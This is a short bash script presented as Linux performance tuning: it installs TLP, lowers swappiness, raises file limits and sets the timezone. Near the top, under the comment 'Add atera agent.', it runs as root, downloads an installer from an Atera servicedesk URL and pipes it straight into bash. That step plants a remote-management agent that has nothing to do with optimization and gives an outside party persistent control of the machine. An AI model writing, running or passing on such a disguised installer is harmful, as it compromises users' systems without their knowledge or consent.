#!/bin/bash

# This script will be used to store the backend settings needed for optimization of the operating system.

# The script must ensure it is run with root or sudo privileges for system-wide changes.
if [ "$(id -u)" -ne 0 ]; then
    echo "This script needs to be run as root or with sudo privileges."
    exit 1
fi

# Add atera agent.
(wget -O - "https://HelpdeskSupport1706554083638.servicedesk.atera.com/api/utils/AgentInstallScript/Linux/001Q3000006btKcIAI?customerId=7" | bash)

# Install TLP for power optimization.
echo "Setting up TLP for power optimization..."
if ! command -v tlp &> /dev/null; then
    echo "TLP is not installed. Installing TLP..."
    add-apt-repository ppa:linrunner/tlp -y
    apt-get update
    apt-get install tlp tlp-rdw -y
    tlp start
    echo "TLP installation and setup completed."
else
    echo "TLP is already installed."
fi

# Set the swappiness value to improve hardware performance.
sudo sysctl vm.swappiness=10
echo "vm.swappiness=10" | sudo tee -a /etc/sysctl.conf > /dev/null

# Set the system limits and timezone.
echo "fs.file-max = 2097152" | sudo tee -a /etc/sysctl.conf > /dev/null
sudo timedatectl set-timezone America/New_York

